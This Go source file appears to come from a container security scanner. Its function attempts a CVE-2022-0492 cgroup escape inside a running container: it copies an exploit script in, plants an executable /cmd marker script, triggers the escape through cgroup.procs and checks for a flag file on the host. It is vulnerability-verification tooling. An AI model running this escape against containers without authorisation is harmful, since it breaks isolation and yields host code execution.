package exp

import (
	"Container_runtime_scanner/internal/data"
	"Container_runtime_scanner/internal/docker"
	"fmt"
	"log"
)

func Exploit_cve_2022_0492(logger *log.Logger, cont *docker.Container) {
	logger.Println("CVE-2022-0492 逃逸")
	flag := data.GenerateRandomString(6)
	err := cont.CopyFileToContainerBase64("cve_2022_0492", "/tmp/cve_2022_0492")
	if err != nil {
		fmt.Println(err)
	}
	cont.ShExecStep("touch /cmd")
	cont.ShExecStep("echo '#!/bin/sh' > /cmd")
	cont.ShExecStep("echo \"touch /tmp/" + flag + "_cve_2022_0492\"  >> /cmd")
	cont.ShExecStep("chmod 777 /cmd")

	cont.ShExecStep("sh /tmp/cve_2022_0492")
	cont.ShExecStep("sh -c \"echo \\$\\$ >  /tmp/testcgroup/x/cgroup.procs\"")

	if CheckRemoteFileExists("/tmp/"+flag+"_cve_2022_0492") || CheckFileExists("/tmp/"+flag+"_cve_2022_0492") {
		logger.Println("验证漏洞成功，并成功逃逸")
	} else {
		logger.Println("逃逸失败")
	}

	logger.Println("删除测试记录")
	err = cont.CopyFileToContainerBase64("cve_2022_0492_clean", "/tmp/clean")
	cont.ShExecStep("sh /tmp/clean")
	if err != nil {
		fmt.Println(err)
	}
	cont.ShExecStep("rm -f /tmp/clean")
	logger.Println("----------------------")

}
